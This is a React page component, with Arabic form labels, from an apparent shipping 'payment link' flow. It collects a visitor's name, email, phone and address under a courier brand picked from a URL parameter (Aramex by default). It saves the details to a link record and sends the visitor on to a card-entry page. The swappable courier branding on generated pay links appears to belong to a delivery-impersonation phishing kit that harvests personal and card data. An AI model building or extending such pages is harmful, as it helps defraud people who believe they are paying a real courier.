import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { formatCurrency } from "@/lib/countryCurrencies";
import { couriers, getCurrency } from "@/themes/themeConfig";
import { User, Mail, Phone, MapPin, ArrowLeft } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const countryParam = urlParams.get('country') || 'SA';
  const currencyParam = urlParams.get('currency') || getCurrency(countryParam);

  const courier = couriers[serviceKey as keyof typeof couriers] || couriers.aramex;
  const serviceName = courier.name;
  const shippingInfo = linkData?.payload as any;
  const payerType = shippingInfo?.payer_type || "recipient";
  const countryCode = shippingInfo?.selectedCountry || countryParam;
  const currencyCode = currencyParam;

  let amount = 500;
  const rawAmount = shippingInfo?.cod_amount;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!linkData) return;

    try {
      const updatedData = {
        ...linkData.payload,
        payment_data: {
          customer_name: customerName,
          customer_email: customerEmail,
          customer_phone: customerPhone,
          residential_address: residentialAddress,
          payer_type: payerType,
        },
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      navigate(`/pay/${id}/card-input?service=${serviceKey}&country=${countryCode}&currency=${currencyCode}`);
    } catch (error) {
      console.error("Error updating payment data:", error);
    }
  };

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title={payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
      description={`الرجاء إدخال جميع البيانات المطلوبة لخدمة ${serviceName}`}
      icon={<User className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      theme="day"
    >
      <form onSubmit={handleProceed} className="space-y-5">
        <div>
          <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-medium">
            <User className="w-4 h-4" />
            الاسم الكامل *
          </Label>
          <Input
            id="name"
            value={customerName}
            onChange={(e) => setCustomerName(e.target.value)}
            required
            className="h-12 text-base"
            placeholder="أدخل اسمك الكامل"
          />
        </div>

        <div>
          <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-medium">
            <Mail className="w-4 h-4" />
            البريد الإلكتروني *
          </Label>
          <Input
            id="email"
            type="email"
            value={customerEmail}
            onChange={(e) => setCustomerEmail(e.target.value)}
            required
            className="h-12 text-base"
            placeholder="example@email.com"
          />
        </div>

        <div>
          <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-medium">
            <Phone className="w-4 h-4" />
            رقم الهاتف *
          </Label>
          <Input
            id="phone"
            type="tel"
            value={customerPhone}
            onChange={(e) => setCustomerPhone(e.target.value)}
            required
            className="h-12 text-base"
            placeholder="5X XXX XXXX"
          />
        </div>

        <div>
          <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-medium">
            <MapPin className="w-4 h-4" />
            العنوان *
          </Label>
          <Input
            id="address"
            value={residentialAddress}
            onChange={(e) => setResidentialAddress(e.target.value)}
            required
            className="h-12 text-base"
            placeholder="أدخل عنوانك الكامل"
          />
        </div>

        <div className="mt-6 p-4 rounded-lg bg-gray-50">
          <div className="flex justify-between items-center">
            <span className="text-sm text-gray-600">المبلغ الإجمالي</span>
            <span className="text-xl font-bold">{formattedAmount}</span>
          </div>
        </div>

        <Button
          type="submit"
          size="lg"
          className="w-full h-14 text-lg font-bold text-white mt-6"
          disabled={!customerName || !customerEmail || !customerPhone || !residentialAddress}
        >
          <span className="ml-2">التالي</span>
          <ArrowLeft className="w-5 h-5" />
        </Button>
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentRecipient;
